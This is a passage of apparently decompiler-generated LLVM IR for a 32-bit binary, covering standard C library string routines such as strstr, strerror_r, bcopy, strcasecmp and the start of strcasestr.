  br i1 %v3_1000a19c, label %dec_label_pc_1000a1d0, label %dec_label_pc_1000a1a4

dec_label_pc_1000a1a4:                            ; preds = %dec_label_pc_1000a198
  %v1_1000a1a4 = add i32 %v0_1000a10c, 2
  %v2_1000a1a4 = inttoptr i32 %v1_1000a1a4 to i8*
  %v3_1000a1a4 = load i8, i8* %v2_1000a1a4, align 1
  %v3_1000a1ac = icmp eq i8 %v3_1000a1a4, 0
  br i1 %v3_1000a1ac, label %dec_label_pc_1000a1d0, label %dec_label_pc_1000a1b4

dec_label_pc_1000a1b4:                            ; preds = %dec_label_pc_1000a1a4
  %v1_1000a1b4 = add i32 %v0_1000a10c, 3
  %v2_1000a1b4 = inttoptr i32 %v1_1000a1b4 to i8*
  %v3_1000a1b4 = load i8, i8* %v2_1000a1b4, align 1
  %v3_1000a1bc = icmp eq i8 %v3_1000a1b4, 0
  br i1 %v3_1000a1bc, label %dec_label_pc_1000a1d0, label %dec_label_pc_1000a1c4

dec_label_pc_1000a1c4:                            ; preds = %dec_label_pc_1000a1b4, %dec_label_pc_1000a16c
  %v2_1000a1c8 = icmp ult i32 %v1_1000a170, %v0_1000a1d4
  br i1 %v2_1000a1c8, label %dec_label_pc_1000a16c, label %dec_label_pc_1000a1d0

dec_label_pc_1000a1d0:                            ; preds = %dec_label_pc_1000a1c4, %dec_label_pc_1000a198, %dec_label_pc_1000a1a4, %dec_label_pc_1000a1b4, %dec_label_pc_1000a15c, %dec_label_pc_1000a10c
  %v0_1000a1dc = phi i32 [ %v0_1000a10c, %dec_label_pc_1000a10c ], [ %v0_1000a160, %dec_label_pc_1000a15c ], [ %v1_1000a1b4, %dec_label_pc_1000a1b4 ], [ %v1_1000a1a4, %dec_label_pc_1000a1a4 ], [ %v1_1000a184, %dec_label_pc_1000a198 ], [ %v0_1000a1d4, %dec_label_pc_1000a1c4 ]
  %v3_1000a1d0 = icmp ugt i32 %v0_1000a1d4, %v0_1000a1dc
  %v0_1000a1dc.v0_1000a1d4 = select i1 %v3_1000a1d0, i32 %v0_1000a1dc, i32 %v0_1000a1d4
  %v2_1000a1e0 = sub i32 %v0_1000a1dc.v0_1000a1d4, %tmp
  ret i32 %v2_1000a1e0

; uselistorder directives
  uselistorder i32 %v1_1000a170, { 1, 0 }
  uselistorder i32 %v0_1000a10c, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000a160, { 1, 0, 2 }
  uselistorder i32 %v1_1000a150, { 1, 0, 2 }
  uselistorder i32 %v0_1000a144, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a1d4, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000a114, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000a1d0, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000a16c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a12c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a124, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000a1e8 = load i8, i8* %arg2, align 1
  %v4_1000a1e8 = zext i8 %v3_1000a1e8 to i32
  store i32 %v4_1000a1e8, i32* %r6.global-to-local, align 4
  %v3_1000a1ec = icmp eq i8 %v3_1000a1e8, 0
  %v0_1000a1f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a1ec, i32 %v0_1000a1f0)
  %v1_1000a1f4 = add i32 %arg1, -1
  store i32 %v1_1000a1f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a1f8

dec_label_pc_1000a1f8:                            ; preds = %dec_label_pc_1000a208, %entry
  %v0_1000a1f8 = phi i32 [ %v1_1000a1f8, %dec_label_pc_1000a208 ], [ %v1_1000a1f4, %entry ]
  %v1_1000a1f8 = add i32 %v0_1000a1f8, 1
  %v2_1000a1f8 = inttoptr i32 %v1_1000a1f8 to i8*
  %v3_1000a1f8 = load i8, i8* %v2_1000a1f8, align 1
  store i32 %v1_1000a1f8, i32* %r3.global-to-local, align 4
  %v3_1000a1fc = icmp eq i8 %v3_1000a1f8, 0
  br i1 %v3_1000a1fc, label %dec_label_pc_1000a2d4, label %dec_label_pc_1000a208

dec_label_pc_1000a208:                            ; preds = %dec_label_pc_1000a1f8
  %v4_1000a200 = icmp eq i8 %v3_1000a1f8, %v3_1000a1e8
  br i1 %v4_1000a200, label %dec_label_pc_1000a20c, label %dec_label_pc_1000a1f8

dec_label_pc_1000a20c:                            ; preds = %dec_label_pc_1000a208
  %v2_1000a20c = add i32 %tmp, 1
  %v3_1000a20c = inttoptr i32 %v2_1000a20c to i8*
  %v4_1000a20c = load i8, i8* %v3_1000a20c, align 1
  %v5_1000a20c = zext i8 %v4_1000a20c to i32
  store i32 %v5_1000a20c, i32* %r5.global-to-local, align 4
  store i32 %v2_1000a20c, i32* %r4.global-to-local, align 4
  %v3_1000a214 = icmp eq i8 %v4_1000a20c, 0
  %v0_1000a218 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a214, i32 %v0_1000a218)
  %v0_1000a21c.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a260

dec_label_pc_1000a228:                            ; preds = %dec_label_pc_1000a2c8
  %v3_1000a228 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000a228 = zext i8 %v3_1000a228 to i32
  store i32 %v1_1000a21c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a250.preheader

dec_label_pc_1000a250.preheader:                  ; preds = %dec_label_pc_1000a228, %dec_label_pc_1000a260
  %v0_1000a25017 = phi i32 [ %v4_1000a228, %dec_label_pc_1000a228 ], [ %storemerge4, %dec_label_pc_1000a260 ]
  %v1_1000a250.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000a25025 = icmp eq i32 %v0_1000a25017, %v1_1000a250.pre
  %v3_1000a25427 = icmp eq i32 %v0_1000a25017, 0
  br i1 %v4_1000a25025, label %dec_label_pc_1000a260, label %dec_label_pc_1000a234

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a250.preheader, %dec_label_pc_1000a24c
  %v3_1000a25429 = phi i1 [ %v3_1000a254, %dec_label_pc_1000a24c ], [ %v3_1000a25427, %dec_label_pc_1000a250.preheader ]
  %v0_1000a23828 = phi i32 [ %v1_1000a24c, %dec_label_pc_1000a24c ], [ %v1_1000a21c, %dec_label_pc_1000a250.preheader ]
  br i1 %v3_1000a25429, label %dec_label_pc_1000a2d4, label %dec_label_pc_1000a238

dec_label_pc_1000a238:                            ; preds = %dec_label_pc_1000a234
  %v1_1000a238 = add i32 %v0_1000a23828, 1
  %v2_1000a238 = inttoptr i32 %v1_1000a238 to i8*
  %v3_1000a238 = load i8, i8* %v2_1000a238, align 1
  %v4_1000a238 = zext i8 %v3_1000a238 to i32
  store i32 %v1_1000a238, i32* %r11.global-to-local, align 4
  %v4_1000a23c = icmp eq i32 %v4_1000a238, %v1_1000a250.pre
  br i1 %v4_1000a23c, label %dec_label_pc_1000a260, label %dec_label_pc_1000a248

dec_label_pc_1000a248:                            ; preds = %dec_label_pc_1000a238
  %v3_1000a240 = icmp eq i8 %v3_1000a238, 0
  br i1 %v3_1000a240, label %dec_label_pc_1000a2d4, label %dec_label_pc_1000a24c

dec_label_pc_1000a24c:                            ; preds = %dec_label_pc_1000a248
  %v1_1000a24c = add i32 %v0_1000a23828, 2
  %v2_1000a24c = inttoptr i32 %v1_1000a24c to i8*
  %v3_1000a24c = load i8, i8* %v2_1000a24c, align 1
  %v4_1000a24c = zext i8 %v3_1000a24c to i32
  store i32 %v1_1000a24c, i32* %r11.global-to-local, align 4
  %v4_1000a250 = icmp eq i32 %v4_1000a24c, %v1_1000a250.pre
  %v3_1000a254 = icmp eq i8 %v3_1000a24c, 0
  br i1 %v4_1000a250, label %dec_label_pc_1000a260, label %dec_label_pc_1000a234

dec_label_pc_1000a260:                            ; preds = %dec_label_pc_1000a250.preheader, %dec_label_pc_1000a24c, %dec_label_pc_1000a238, %dec_label_pc_1000a20c
  %v0_1000a21c.sink = phi i32 [ %v0_1000a21c.sink.pre, %dec_label_pc_1000a20c ], [ %v1_1000a21c, %dec_label_pc_1000a250.preheader ], [ %v1_1000a24c, %dec_label_pc_1000a24c ], [ %v1_1000a238, %dec_label_pc_1000a238 ]
  %v1_1000a21c = add i32 %v0_1000a21c.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000a21c to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000a21c, i32* %r11.global-to-local, align 4
  %v1_1000a260 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000a260 = icmp eq i32 %storemerge4, %v1_1000a260
  br i1 %v4_1000a260, label %dec_label_pc_1000a268, label %dec_label_pc_1000a250.preheader

dec_label_pc_1000a268:                            ; preds = %dec_label_pc_1000a260
  %v1_1000a268 = add i32 %v0_1000a21c.sink, 2
  %v2_1000a268 = inttoptr i32 %v1_1000a268 to i8*
  %v3_1000a268 = load i8, i8* %v2_1000a268, align 1
  %v4_1000a268 = zext i8 %v3_1000a268 to i32
  store i32 %v4_1000a268, i32* %r10.global-to-local, align 4
  store i32 %v0_1000a21c.sink, i32* %r3.global-to-local, align 4
  %v0_1000a270 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a270 = add i32 %v0_1000a270, 1
  %v2_1000a270 = inttoptr i32 %v1_1000a270 to i8*
  %v3_1000a270 = load i8, i8* %v2_1000a270, align 1
  %v4_1000a270 = zext i8 %v3_1000a270 to i32
  store i32 %v1_1000a270, i32* %r8.global-to-local, align 4
  store i32 %v1_1000a268, i32* %r11.global-to-local, align 4
  %v4_1000a27c = icmp eq i8 %v3_1000a268, %v3_1000a270
  br i1 %v4_1000a27c, label %dec_label_pc_1000a284, label %dec_label_pc_1000a2c8

dec_label_pc_1000a284:                            ; preds = %dec_label_pc_1000a268, %dec_label_pc_1000a2b0.dec_label_pc_1000a284_crit_edge
  %v0_1000a28c = phi i32 [ %v0_1000a28c.pre, %dec_label_pc_1000a2b0.dec_label_pc_1000a284_crit_edge ], [ %v1_1000a270, %dec_label_pc_1000a268 ]
  %v0_1000a288 = phi i32 [ %v0_1000a288.pre, %dec_label_pc_1000a2b0.dec_label_pc_1000a284_crit_edge ], [ %v1_1000a268, %dec_label_pc_1000a268 ]
  %v0_1000a284 = phi i32 [ %v4_1000a2b4, %dec_label_pc_1000a2b0.dec_label_pc_1000a284_crit_edge ], [ %v4_1000a268, %dec_label_pc_1000a268 ]
  %v3_1000a284 = icmp eq i32 %v0_1000a284, 0
  %v1_1000a288 = add i32 %v0_1000a288, 1
  store i32 %v1_1000a288, i32* %r7.global-to-local, align 4
  %v1_1000a28c = add i32 %v0_1000a28c, 1
  store i32 %v1_1000a28c, i32* %r10.global-to-local, align 4
  %v0_1000a290 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a284, i32 %v0_1000a290)
  %v0_1000a294 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a294 = add i32 %v0_1000a294, 1
  %v2_1000a294 = inttoptr i32 %v1_1000a294 to i8*
  %v3_1000a294 = load i8, i8* %v2_1000a294, align 1
  %v4_1000a294 = zext i8 %v3_1000a294 to i32
  %v0_1000a298 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a298 = add i32 %v0_1000a298, 1
  store i32 %v1_1000a298, i32* %r8.global-to-local, align 4
  %v0_1000a29c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a29c = add i32 %v0_1000a29c, 1
  %v2_1000a29c = inttoptr i32 %v1_1000a29c to i8*
  %v3_1000a29c = load i8, i8* %v2_1000a29c, align 1
  %v0_1000a2a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a2a0 = add i32 %v0_1000a2a0, 1
  store i32 %v1_1000a2a0, i32* %r11.global-to-local, align 4
  %v4_1000a2a8 = icmp eq i8 %v3_1000a29c, %v3_1000a294
  br i1 %v4_1000a2a8, label %dec_label_pc_1000a2b0, label %dec_label_pc_1000a2c8

dec_label_pc_1000a2b0:                            ; preds = %dec_label_pc_1000a284
  %v3_1000a2a4 = icmp eq i8 %v3_1000a294, 0
  %v0_1000a2b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a2a4, i32 %v0_1000a2b0)
  %v0_1000a2b4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a2b4 = add i32 %v0_1000a2b4, 1
  %v2_1000a2b4 = inttoptr i32 %v1_1000a2b4 to i8*
  %v3_1000a2b4 = load i8, i8* %v2_1000a2b4, align 1
  %v4_1000a2b4 = zext i8 %v3_1000a2b4 to i32
  %v0_1000a2b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a2b8 = add i32 %v0_1000a2b8, 1
  %v2_1000a2b8 = inttoptr i32 %v1_1000a2b8 to i8*
  %v3_1000a2b8 = load i8, i8* %v2_1000a2b8, align 1
  store i32 %v4_1000a2b4, i32* %r10.global-to-local, align 4
  %v4_1000a2c0 = icmp eq i8 %v3_1000a2b8, %v3_1000a2b4
  br i1 %v4_1000a2c0, label %dec_label_pc_1000a2b0.dec_label_pc_1000a284_crit_edge, label %dec_label_pc_1000a2c8

dec_label_pc_1000a2b0.dec_label_pc_1000a284_crit_edge: ; preds = %dec_label_pc_1000a2b0
  %v0_1000a288.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a28c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a284

dec_label_pc_1000a2c8:                            ; preds = %dec_label_pc_1000a2b0, %dec_label_pc_1000a284, %dec_label_pc_1000a268
  %v0_1000a2c8 = phi i32 [ %v4_1000a270, %dec_label_pc_1000a268 ], [ %v4_1000a2b4, %dec_label_pc_1000a2b0 ], [ %v4_1000a294, %dec_label_pc_1000a284 ]
  %v3_1000a2c8 = icmp eq i32 %v0_1000a2c8, 0
  br i1 %v3_1000a2c8, label %dec_label_pc_1000a2d0, label %dec_label_pc_1000a228

dec_label_pc_1000a2d0:                            ; preds = %dec_label_pc_1000a2c8
  ret i32 %v0_1000a21c.sink

dec_label_pc_1000a2d4:                            ; preds = %dec_label_pc_1000a1f8, %dec_label_pc_1000a248, %dec_label_pc_1000a234
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000a2b4, { 0, 2, 1 }
  uselistorder i8 %v3_1000a294, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000a21c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000a21c.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a24c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a23828, { 1, 0 }
  uselistorder i32 %v1_1000a250.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000a1f8, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000a2d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a284, { 1, 0 }
  uselistorder label %dec_label_pc_1000a260, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000a234, { 1, 0 }
  uselistorder label %dec_label_pc_1000a250.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268477172, i32* @lr, align 4
  %v0_1000a2f0 = call i32 @__xpg_strerror_r()
  %v0_1000a2f8 = load i32, i32* @r29, align 4
  ret i32 %v0_1000a2f8
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000a30c = load i32, i32* @r3, align 4
  %v2_1000a30c = icmp ugt i32 %v0_1000a30c, 124
  %v0_1000a31c = load i32, i32* @r4, align 4
  store i32 %v0_1000a31c, i32* %r27.global-to-local, align 4
  %v0_1000a324 = load i32, i32* @r5, align 4
  br i1 %v2_1000a30c, label %dec_label_pc_1000a368, label %dec_label_pc_1000a32c

dec_label_pc_1000a32c:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_10012998.595 to i32), i32* %r30.global-to-local, align 4
  %v3_1000a3487 = icmp eq i32 %v0_1000a30c, 0
  br i1 %v3_1000a3487, label %dec_label_pc_1000a35c, label %dec_label_pc_1000a33c

dec_label_pc_1000a33c:                            ; preds = %dec_label_pc_1000a32c, %dec_label_pc_1000a33c
  %v0_1000a340 = phi i32 [ %v1_1000a340, %dec_label_pc_1000a33c ], [ ptrtoint ([8 x i8]* @global_var_10012998.595 to i32), %dec_label_pc_1000a32c ]
  %v1_1000a340 = add i32 %v0_1000a340, 1
  store i32 %v1_1000a340, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a33c

dec_label_pc_1000a35c:                            ; preds = %dec_label_pc_1000a32c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a39c

dec_label_pc_1000a368:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000a30c, 0
  %v1_1000a36c = zext i1 %tmp to i32
  %v2_1000a36c = ashr i32 %v0_1000a30c, 31
  %v3_1000a36c = and i32 %v2_1000a36c, -2
  %v4_1000a36c = or i32 %v3_1000a36c, %v1_1000a36c
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000a380 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000a380 = call i32 @_uintmaxtostr(i8* %v5_1000a380, i32 %v4_1000a36c, i32 %v0_1000a30c, i32 -10, i32 0)
  %v1_1000a388 = add i32 %v6_1000a380, -14
  store i32 %v1_1000a388, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10012988.596 to i32), i32* @r4, align 4
  store i32 %v1_1000a388, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268477340, i32* @lr, align 4
  %v0_1000a398 = call i32 @memcpy()
  %v0_1000a39c.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000a3a0.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a3b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000a39c

dec_label_pc_1000a39c:                            ; preds = %dec_label_pc_1000a35c, %dec_label_pc_1000a368
  %v0_1000a3b0 = phi i32 [ %v0_1000a324, %dec_label_pc_1000a35c ], [ %v0_1000a3b0.pre, %dec_label_pc_1000a368 ]
  %v0_1000a3a0 = phi i32 [ ptrtoint ([8 x i8]* @global_var_10012998.595 to i32), %dec_label_pc_1000a35c ], [ %v0_1000a3a0.pre, %dec_label_pc_1000a368 ]
  %v1_1000a3a4 = phi i32 [ %v0_1000a31c, %dec_label_pc_1000a35c ], [ %v0_1000a39c.pre, %dec_label_pc_1000a368 ]
  %tmp19 = icmp slt i32 %v1_1000a3a4, 0
  %v1_1000a39c = zext i1 %tmp19 to i32
  %v2_1000a39c = ashr i32 %v1_1000a3a4, 31
  %v3_1000a39c = and i32 %v2_1000a39c, -2
  %v4_1000a39c = or i32 %v3_1000a39c, %v1_1000a39c
  store i32 %v0_1000a3a0, i32* @r3, align 4
  %v2_1000a3a4 = xor i32 %v4_1000a39c, %v1_1000a3a4
  %v2_1000a3a8 = sub i32 %v4_1000a39c, %v2_1000a3a4
  %tmp20 = icmp slt i32 %v2_1000a3a8, 0
  %v1_1000a3ac = zext i1 %tmp20 to i32
  %v2_1000a3ac = ashr i32 %v2_1000a3a8, 31
  %v3_1000a3ac = and i32 %v2_1000a3ac, -2
  %v4_1000a3ac = or i32 %v3_1000a3ac, %v1_1000a3ac
  %v2_1000a3b0 = and i32 %v4_1000a3ac, %v0_1000a3b0
  store i32 %v2_1000a3b0, i32* @r29, align 4
  %v0_1000a3b4 = call i32 @__GI_strlen()
  %v1_1000a3b8 = add i32 %v0_1000a3b4, 1
  store i32 %v1_1000a3b8, i32* %r31.global-to-local, align 4
  %v1_1000a3bc = load i32, i32* @r29, align 4
  %v3_1000a3bc = icmp ugt i32 %v1_1000a3b8, %v1_1000a3bc
  br i1 %v3_1000a3bc, label %dec_label_pc_1000a3c4, label %dec_label_pc_1000a3cc

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a39c
  store i32 %v1_1000a3bc, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a3cc

dec_label_pc_1000a3cc:                            ; preds = %dec_label_pc_1000a39c, %dec_label_pc_1000a3c4
  %v0_1000a3dc = phi i32 [ %v1_1000a3bc, %dec_label_pc_1000a3c4 ], [ %v1_1000a3b8, %dec_label_pc_1000a39c ]
  %v3_1000a3cc = icmp eq i32 %v0_1000a3dc, 0
  br i1 %v3_1000a3cc, label %dec_label_pc_1000a3f0, label %dec_label_pc_1000a3d4

dec_label_pc_1000a3d4:                            ; preds = %dec_label_pc_1000a3cc
  %v0_1000a3d4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000a3d4, i32* @r4, align 4
  %v0_1000a3d8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000a3d8, i32* @r3, align 4
  store i32 %v0_1000a3dc, i32* @r5, align 4
  store i32 268477412, i32* @lr, align 4
  %v0_1000a3e0 = call i32 @memcpy()
  %v1_1000a3e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a3e4 = add i32 %v1_1000a3e4, %v0_1000a3d8
  %v3_1000a3ec = add i32 %v2_1000a3e4, -1
  %v4_1000a3ec = inttoptr i32 %v3_1000a3ec to i8*
  store i8 0, i8* %v4_1000a3ec, align 1
  br label %dec_label_pc_1000a3f0

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3cc, %dec_label_pc_1000a3d4
  %v0_1000a3f0 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000a3f0 = icmp eq i32 %v0_1000a3f0, 0
  br i1 %v3_1000a3f0, label %dec_label_pc_1000a400, label %dec_label_pc_1000a3f8

dec_label_pc_1000a3f8:                            ; preds = %dec_label_pc_1000a3f0
  %v0_1000a3f8 = call i32 @__errno_location()
  %v0_1000a3fc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000a3fc = inttoptr i32 %v0_1000a3f8 to i32*
  store i32 %v0_1000a3fc, i32* %v2_1000a3fc, align 4
  %v0_1000a404.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a400

dec_label_pc_1000a400:                            ; preds = %dec_label_pc_1000a3f0, %dec_label_pc_1000a3f8
  %v0_1000a404 = phi i32 [ 0, %dec_label_pc_1000a3f0 ], [ %v0_1000a404.pre, %dec_label_pc_1000a3f8 ]
  ret i32 %v0_1000a404

; uselistorder directives
  uselistorder i32 %v2_1000a3a8, { 1, 0 }
  uselistorder i32 %v4_1000a39c, { 1, 0 }
  uselistorder i32 %v1_1000a3a4, { 1, 2, 0 }
  uselistorder i32 %v1_1000a340, { 1, 0 }
  uselistorder i32 %v0_1000a30c, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_10012998.595 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a400, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a39c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a33c, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000a424 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000a424
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000a42c = load i32, i32* bitcast (i32** @global_var_10024a1c.598 to i32*), align 4
  %v0_1000a434.pre = load i32, i32* @r3, align 4
  %v1_1000a434.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000a434

dec_label_pc_1000a434:                            ; preds = %dec_label_pc_1000a45c, %entry
  %v0_1000a4706 = phi i32 [ %v0_1000a4707, %dec_label_pc_1000a45c ], [ 0, %entry ]
  %v0_1000a460 = phi i32 [ %v1_1000a460, %dec_label_pc_1000a45c ], [ %v1_1000a434.pre, %entry ]
  %v0_1000a464 = phi i32 [ %v1_1000a464, %dec_label_pc_1000a45c ], [ %v0_1000a434.pre, %entry ]
  %v4_1000a434 = icmp eq i32 %v0_1000a464, %v0_1000a460
  %.pre = inttoptr i32 %v0_1000a464 to i8*
  br i1 %v4_1000a434, label %dec_label_pc_1000a45c, label %dec_label_pc_1000a43c

dec_label_pc_1000a43c:                            ; preds = %dec_label_pc_1000a434
  %v2_1000a43c = load i8, i8* %.pre, align 1
  %v3_1000a43c = zext i8 %v2_1000a43c to i32
  %v1_1000a440 = inttoptr i32 %v0_1000a460 to i8*
  %v2_1000a440 = load i8, i8* %v1_1000a440, align 1
  %v3_1000a440 = zext i8 %v2_1000a440 to i32
  %v1_1000a444 = mul nuw nsw i32 %v3_1000a43c, 2
  %v1_1000a448 = mul nuw nsw i32 %v3_1000a440, 2
  %v2_1000a44c = add i32 %v1_1000a444, %v3_1000a42c
  %v3_1000a44c = inttoptr i32 %v2_1000a44c to i16*
  %v4_1000a44c = load i16, i16* %v3_1000a44c, align 2
  %v5_1000a44c = sext i16 %v4_1000a44c to i32
  %v2_1000a450 = add i32 %v1_1000a448, %v3_1000a42c
  %v3_1000a450 = inttoptr i32 %v2_1000a450 to i16*
  %v4_1000a450 = load i16, i16* %v3_1000a450, align 2
  %v5_1000a450 = sext i16 %v4_1000a450 to i32
  %v2_1000a454 = sub nsw i32 %v5_1000a44c, %v5_1000a450
  %v4_1000a458 = icmp eq i16 %v4_1000a44c, %v4_1000a450
  br i1 %v4_1000a458, label %dec_label_pc_1000a45c, label %dec_label_pc_1000a470

dec_label_pc_1000a45c:                            ; preds = %dec_label_pc_1000a434, %dec_label_pc_1000a43c
  %v0_1000a4707 = phi i32 [ %v2_1000a454, %dec_label_pc_1000a43c ], [ %v0_1000a4706, %dec_label_pc_1000a434 ]
  %v2_1000a45c = load i8, i8* %.pre, align 1
  %v1_1000a460 = add i32 %v0_1000a460, 1
  %v1_1000a464 = add i32 %v0_1000a464, 1
  %v3_1000a468 = icmp eq i8 %v2_1000a45c, 0
  br i1 %v3_1000a468, label %dec_label_pc_1000a470, label %dec_label_pc_1000a434

dec_label_pc_1000a470:                            ; preds = %dec_label_pc_1000a45c, %dec_label_pc_1000a43c
  %v0_1000a470 = phi i32 [ %v0_1000a4707, %dec_label_pc_1000a45c ], [ %v2_1000a454, %dec_label_pc_1000a43c ]
  ret i32 %v0_1000a470

; uselistorder directives
  uselistorder i32 %v2_1000a454, { 1, 0 }
  uselistorder i32 %v0_1000a464, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a45c, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000a480 = load i32, i32* bitcast (i32** @global_var_10024a1c.598 to i32*), align 4
  store i32 %v3_1000a480, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a488

dec_label_pc_1000a488:                            ; preds = %dec_label_pc_1000a488.backedge, %entry
  %v0_1000a488 = phi i32 [ %v0_1000a488.pre, %dec_label_pc_1000a488.backedge ], [ %arg2, %entry ]
  %v1_1000a488 = inttoptr i32 %v0_1000a488 to i8*
  %v2_1000a488 = load i8, i8* %v1_1000a488, align 1
  %v3_1000a488 = zext i8 %v2_1000a488 to i32
  store i32 %v3_1000a488, i32* %r0.global-to-local, align 4
  %v1_1000a48c = add i32 %v0_1000a488, 1
  store i32 %v1_1000a48c, i32* %r10.global-to-local, align 4
  %v3_1000a490 = icmp eq i8 %v2_1000a488, 0
